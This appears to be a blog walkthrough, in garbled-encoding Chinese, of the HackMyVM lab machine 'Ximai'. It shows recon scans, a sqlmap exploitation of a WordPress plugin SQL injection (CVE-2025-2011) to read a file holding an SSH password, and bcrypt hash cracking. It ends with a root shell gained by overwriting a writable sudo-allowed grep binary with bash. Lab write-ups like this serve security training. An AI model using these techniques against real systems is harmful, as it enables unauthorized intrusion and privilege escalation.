{"pageProps":{"postData":{"id":"HackMyVMXimai","contentHtml":"<h1>Ximai</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Ximai\">https://hackmyvm.eu/machines/machine.php?vm=Ximai</a></p>\n</blockquote>\n<p>Notesï¼š<strong>More than one path to initial access.</strong></p>\n<p><img src=\"/post-images/HackMyVMXimai/image.png\" alt=\"image.png\"></p>\n<p>PS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯<code>Ximai</code>ï¼Œä¸æ˜¯<code>Ximia</code>ï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚</p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">âœ  Ximia nmap -sT -min-rate 10000 192.168.56.62 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:32 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.62\nHost is up (0.0012s latency).\nNot shown: 996 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n8000/tcp open  http-alt\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.50 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Ximia nmap -sT -A -p 22,80,3306,8000 192.168.56.62\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:33 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.62\nHost is up (0.0036s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Ubuntu Default Page: It works\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\n8000/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: NeonGrid Solutions\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-generator: WordPress 6.8.1\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   3.57 ms 192.168.56.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 36.01 seconds\n</code></pre>\n<p>è®¿é—® <code>HTTP</code> ï¼Œ<code>80</code>ç«¯å£æ˜¯é»˜è®¤é¡µé¢</p>\n<p><img src=\"/post-images/HackMyVMXimai/image1.png\" alt=\"image.png\"></p>\n<p><code>8080</code>ç«¯å£æ˜¯<code>wordpress</code>ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸€ä¸ªä¿¡æ¯</p>\n<p><img src=\"/post-images/HackMyVMXimai/image2.png\" alt=\"image.png\"></p>\n<p>ä¿¡æ¯æ˜¯ï¼š</p>\n<p><img src=\"/post-images/HackMyVMXimai/image3.png\" alt=\"image.png\"></p>\n<p><code>80</code>ç«¯å£æ‰«æä¸€ä¸‹ç›®å½•ï¼Œ<code>8000</code>ç«¯å£ç›´æ¥ä¸Š<code>WPScan</code></p>\n<pre><code class=\"hljs language-bash\">âœ  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.62\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ <span class=\"hljs-literal\">true</span>\n ğŸ’²  Extensions            â”‚ [php, zip, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET     1022l     5262w    85827c http://192.168.56.62/info.php\n[>-------------------] - 1s      1233/882208  39m     found:1       errors:2      \n[>-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                \n200      GET      376l      965w    10938c http://192.168.56.62/\n200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg\n200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt\n[####################] - 6m    882228/882228  0s      found:5       errors:2      \n[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ \n[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ => Directory listing (add --scan-dir-listings to scan)  \n</code></pre>\n<p>ä¸‹é¢æ˜¯<code>80</code>ç«¯å£ä¸­æ‰«æå‡ºæ¥çš„é¡µé¢</p>\n<p><img src=\"/post-images/HackMyVMXimai/image4.png\" alt=\"image.png\"></p>\n<p>(?è¯´æˆ‘å—ğŸ˜­)</p>\n<p><img src=\"/post-images/HackMyVMXimai/image5.png\" alt=\"image.png\"></p>\n<p>è¿™ä¸ª<code>creds.txt</code>å¯èƒ½è¿˜æœ‰ç‚¹ç”¨ï¼Œå› ä¸º<code>mysqli.allow_local_infile</code>ä¹Ÿå¼€å¯ç€ï¼Œå¯ä»¥é€šè¿‡æ•°æ®åº“å»è¯»</p>\n<p><img src=\"/post-images/HackMyVMXimai/image6.png\" alt=\"image.png\"></p>\n<p>æ¥ä¸‹æ¥çœ‹<code>Wpscan</code> çš„ç»“æœï¼Œæ‰«æåˆ°å­˜åœ¨ <code>SQL</code>æ³¨å…¥ï¼Œ<code>CVE-2025-2011</code></p>\n<p><img src=\"/post-images/HackMyVMXimai/image7.png\" alt=\"image.png\"></p>\n<h2>CVE-2025-2011</h2>\n<p>POCï¼š<a href=\"https://github.com/datagoboom/CVE-2025-2011\">https://github.com/datagoboom/CVE-2025-2011</a></p>\n<p>ä½†æ˜¯è¿™é‡Œé€šè¿‡<code>POC</code>æ— æ³•è¿›è¡Œåˆ©ç”¨</p>\n<p><img src=\"/post-images/HackMyVMXimai/image8.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬è§‚å¯Ÿ<code>POC</code>ï¼Œå°è¯•ä½¿ç”¨<code>SQLmap</code>æ¥æ‰«</p>\n<p><img src=\"/post-images/HackMyVMXimai/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">sqlmap -u <span class=\"hljs-string\">\"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&#x26;perpage=20&#x26;page=1&#x26;orderBy=source_id&#x26;dateEnd=&#x26;dateStart=&#x26;order=DESC&#x26;sources=&#x26;action=depicter-lead-index\"</span> -batch  \n</code></pre>\n<p><img src=\"/post-images/HackMyVMXimai/image10.png\" alt=\"image.png\"></p>\n<p>è¿™æ ·å°±å¯ä»¥æ‰«æå‡ºæ¥äº†ï¼Œæˆ‘ä»¬æ ¹æ®å‰é¢çš„çº¿ç´¢æ¥ç›´æ¥è¯»å–æ–‡ä»¶ <code>/etc/jimmy.txt</code></p>\n<pre><code class=\"hljs language-bash\">sqlmap -u <span class=\"hljs-string\">\"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&#x26;perpage=20&#x26;page=1&#x26;orderBy=source_id&#x26;dateEnd=&#x26;dateStart=&#x26;order=DESC&#x26;sources=&#x26;action=depicter-lead-index\"</span> -batch --file-read /etc/jimmy.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  files <span class=\"hljs-built_in\">cat</span> _etc_jimmy.txt \nHandsomeHU\n</code></pre>\n<p><code>ssh</code> ç™»å½•</p>\n<p><img src=\"/post-images/HackMyVMXimai/image11.png\" alt=\"image.png\"></p>\n<h2>æƒé™æå‡</h2>\n<p>å½“å¤´ä¸€æ£’</p>\n<pre><code class=\"hljs language-bash\">jimmy@Ximai:~$ <span class=\"hljs-built_in\">ls</span>\nsorry, you are restricted from using this <span class=\"hljs-built_in\">command</span>.\n</code></pre>\n<p>æŸ¥çœ‹ç¯å¢ƒå˜é‡</p>\n<pre><code class=\"hljs language-bash\">jimmy@Ximai:~$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$PATH</span>\n./...\n</code></pre>\n<p>ç›´æ¥æ¢å¤ä¸€ä¸‹ç¯å¢ƒå˜é‡å°±è¡Œäº†</p>\n<pre><code class=\"hljs language-bash\">jimmy@Ximai:~$ <span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"</span>\n</code></pre>\n<p>å½“å‰ç›®å½•ä¸‹èƒ½è¯»å–<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">jimmy@Ximai:~$ <span class=\"hljs-built_in\">cat</span> us3r.txt \nflag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}\n</code></pre>\n<p>æŸ¥çœ‹<code>sudo</code>æƒé™</p>\n<pre><code class=\"hljs language-bash\">jimmy@Ximai:~$ <span class=\"hljs-built_in\">sudo</span> -l\n\nWe trust you have received the usual lecture from the <span class=\"hljs-built_in\">local</span> System\nAdministrator. It usually boils down to these three things:\n\n    <span class=\"hljs-comment\">#1) Respect the privacy of others.</span>\n    <span class=\"hljs-comment\">#2) Think before you type.</span>\n    <span class=\"hljs-comment\">#3) With great power comes great responsibility.</span>\n\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> jimmy: \nSorry, user jimmy may not run <span class=\"hljs-built_in\">sudo</span> on Ximai.\n</code></pre>\n<p>æŸ¥çœ‹<code>wp-config.php</code></p>\n<pre><code class=\"hljs language-bash\">/** Database username */\ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'root'</span> );       \n                                                                                                \n/** Database password */                                                                        \ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'SuperSecret'</span> ); \n</code></pre>\n<p>æ•°æ®åº“è¡¨ä¿¡æ¯</p>\n<pre><code class=\"hljs language-bash\">MariaDB [wordpress]> <span class=\"hljs-keyword\">select</span> * from wp_users;\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n|  1 | adminer    | $wp$2y$10<span class=\"hljs-variable\">$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq</span> | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.000 sec)\n</code></pre>\n<p>å°è¯•å¯†ç çˆ†ç ´ï¼Œè¿™é‡Œä½¿ç”¨<code>rockyou</code>æ— æ³•çˆ†ç ´å‡ºæ¥ï¼Œå¤ªæ…¢äº†</p>\n<pre><code class=\"hljs language-bash\">âœ  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n</code></pre>\n<p>ä½¿ç”¨<code>cupp</code>ç”Ÿæˆå¼±å¯†ç å­—å…¸è¿›è¡Œå°è¯•</p>\n<p><img src=\"/post-images/HackMyVMXimai/image12.png\" alt=\"image.png\"></p>\n<p>ä¹Ÿä¸èƒ½ç ´è§£ï¼Œæˆ‘ä»¬é€šè¿‡<code>top 100</code>åŠ ä¸Šç”¨æˆ·ååˆ¶ä½œå­—å…¸</p>\n<pre><code class=\"hljs language-bash\">âœ  Ximia <span class=\"hljs-built_in\">cat</span> /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk <span class=\"hljs-string\">'{print \"adminer\"$1}'</span> > maybe.txt\n</code></pre>\n<p>å¾—åˆ°å¯†ç  <code>adminer123456</code></p>\n<p><img src=\"/post-images/HackMyVMXimai/image13.png\" alt=\"image.png\"></p>\n<p>æŸ¥çœ‹ <code>sudo</code> æƒé™</p>\n<pre><code class=\"hljs language-bash\">adminer@Ximai:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> adminer on Ximai:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser adminer may run the following commands on Ximai:\n    (ALL) NOPASSWD: /usr/bin/grep\n</code></pre>\n<pre><code class=\"hljs language-bash\">adminer@Ximai:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/grep \nsorry, you are restricted from using this command.try egrep instead.\n</code></pre>\n<p>666å­—ç¬¦ä¸²</p>\n<pre><code class=\"hljs language-bash\">adminer@Ximai:~$ <span class=\"hljs-built_in\">cat</span> /usr/bin/grep\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'sorry, you are restricted from using this command.try egrep instead.'</span>\n</code></pre>\n<p>æŸ¥çœ‹æƒé™ï¼Œæœ‰å†™å…¥æƒé™</p>\n<pre><code class=\"hljs language-bash\">adminer@Ximai:~$ <span class=\"hljs-built_in\">ls</span> -al /usr/bin/grep\n-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep\n</code></pre>\n<p>ç›´æ¥æ¢­å“ˆ</p>\n<pre><code class=\"hljs language-bash\">adminer@Ximai:~$ <span class=\"hljs-built_in\">cat</span> /bin/bash > /usr/bin/grep\nadminer@Ximai:~$ <span class=\"hljs-built_in\">sudo</span> grep\nroot@Ximai:/home/adminer# \n</code></pre>\n<p>è¯»å– <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@Ximai:~# <span class=\"hljs-built_in\">cat</span> r00t.txt \nflag{root-126e5653-3b02-11f0-b074-000c2921b441}\n</code></pre>","title":"HackMyVM - Ximai","date":"2025-07-14","updated":"2025-07-14","tags":["HackMyVM","Linux","WordPress","CVE-2025-2011","Password_generator"],"categories":"é¶æœº","comments":true,"description":"Ximai\n\n https://hackmyvm.eu/machines/machine.php?vm=Ximai\n \n\nNotesï¼šMore than one path to initial access.\n\n\n\nPS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯`Ximai`ï¼Œä¸æ˜¯`Ximia`ï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚\n\nRecon\n\n\n\n\n\nè®¿é—® `HTTP` ï¼Œ`80`ç«¯å£æ˜¯é»˜è®¤é¡µé¢\n\n\n\n`8080`ç«¯å£æ˜¯`word..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}